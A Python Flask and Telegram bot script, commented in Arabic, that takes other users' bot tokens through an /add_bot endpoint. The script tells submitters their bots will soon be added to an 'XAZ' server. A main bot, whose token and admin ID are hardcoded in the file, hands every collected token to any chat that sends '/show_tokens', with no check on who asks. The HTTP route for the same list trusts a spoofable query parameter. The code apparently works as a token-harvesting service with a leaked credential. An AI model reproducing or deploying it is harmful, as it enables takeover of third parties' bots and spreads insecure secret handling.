from flask import Flask, request, jsonify
import requests
import threading

app = Flask(__name__)

# تخزين معلومات البوتات
bots = {}

# التوكن الأساسي لإدارة البوتات
MAIN_BOT_TOKEN = "7647664924:AAFFFndSW8pdfn5BytglDLELe7fm-uSOlS8"
ADMIN_ID = "7796858163"

TELEGRAM_API_URL = "https://api.telegram.org/bot"

# إرسال رسالة عبر API تلجرام
def send_message(bot_token, chat_id, text):
    url = f"{TELEGRAM_API_URL}{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=payload)

# دالة لمعالجة الرسائل الواردة لأي بوت
def listen_to_bot(bot_token):
    offset = 0
    while True:
        url = f"{TELEGRAM_API_URL}{bot_token}/getUpdates"
        params = {"offset": offset, "timeout": 30}
        response = requests.get(url, params=params).json()

        if response.get("ok"):
            for update in response.get("result", []):
                offset = update["update_id"] + 1
                message = update.get("message", {})
                chat_id = message.get("chat", {}).get("id")
                user_id = message.get("from", {}).get("id")
                text = message.get("text", "")

                if str(user_id) in bots[bot_token]['admins']:
                    response_text = f"**تم استلام رسالة من الإداري:**\n{text}"
                else:
                    response_text = "**تم إرسال طلب للسيرفر، قريبًا سيتم إضافة هذا البوت لسيرفر XAZ، يُرجى الانتظار 🤖**"

                send_message(bot_token, chat_id, response_text)

# إضافة بوت جديد عبر API
@app.route('/add_bot', methods=['POST'])
def add_bot():
    data = request.json
    token = data.get('token')
    admin_id = data.get('admin_id')

    if not token or not admin_id:
        return jsonify({'error': 'يجب توفير التوكن و ID الإداري'}), 400

    bots[token] = {'admins': [str(admin_id)]}
    threading.Thread(target=listen_to_bot, args=(token,)).start()

    return jsonify({'message': 'تمت إضافة البوت بنجاح', 'token': token, 'admin_id': admin_id})

# عرض التوكنات المخزنة (للإداري فقط)
@app.route('/show_tokens', methods=['GET'])
def show_tokens():
    user_id = request.args.get('user_id')
    
    if str(user_id) != ADMIN_ID:
        return jsonify({'error': 'أنت لست الإداري'}), 403

    tokens_info = {"tokens": []}
    for token, data in bots.items():
        tokens_info["tokens"].append({
            "token": token,
            "admins": data['admins']
        })
    
    return jsonify(tokens_info)

# تشغيل البوت الرئيسي للاستجابة للأوامر
def main_bot_listener():
    offset = 0
    while True:
        url = f"{TELEGRAM_API_URL}{MAIN_BOT_TOKEN}/getUpdates"
        params = {"offset": offset, "timeout": 30}
        response = requests.get(url, params=params).json()

        if response.get("ok"):
            for update in response.get("result", []):
                offset = update["update_id"] + 1
                message = update.get("message", {})
                chat_id = message.get("chat", {}).get("id")
                text = message.get("text", "")

                if text == "/show_tokens":
                    response_text = "**التوكنات المخزنة:**\n"
                    for token, data in bots.items():
                        response_text += f"**التوكن:** `{token}`\n**Admin IDs:** {', '.join(data['admins'])}\n\n"
                    send_message(MAIN_BOT_TOKEN, chat_id, response_text)

# تشغيل السيرفر والبوت الرئيسي
if __name__ == '__main__':
    # تشغيل البوت الرئيسي في Thread منفصل
    threading.Thread(target=main_bot_listener).start()
    
    # تشغيل سيرفر Flask
    app.run(port=5000)
